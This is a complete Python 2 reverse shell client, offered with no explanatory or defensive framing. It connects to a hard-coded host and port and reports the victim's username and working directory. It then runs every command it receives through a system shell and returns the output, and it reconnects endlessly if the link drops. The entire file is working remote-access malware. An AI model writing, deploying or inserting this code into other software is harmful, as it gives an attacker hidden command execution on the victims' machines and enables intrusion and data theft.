from socket import socket, error
from os import getcwd, chdir, environ
from subprocess import Popen, PIPE
from time import sleep


def connection():
    username = environ.get('USERNAME')
    s = socket()
    host = "192.168.0.10"
    port = 9090
    s.connect((host, port))
    s.send("Connected to " + username + "'s computer\n" + getcwd())
    while True:
        cmd = (s.recv(1024))
        print(cmd)
        if cmd[:3] == "cd " and not cmd == "cd":
            try:
                print("Changing Directory to " + cmd)
                chdir(cmd[3:])
                response = ""
            except WindowsError:
                response = "Directory Not Found"
        else:
            response = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            response = response.stdout.read() + response.stderr.read()
        s.send(response + "\n" + getcwd())


x = 0
while True:
    try:
        connection()
    except error:
        x += 1
        print("Retrying ... ({})".format(x))
        sleep(.5)
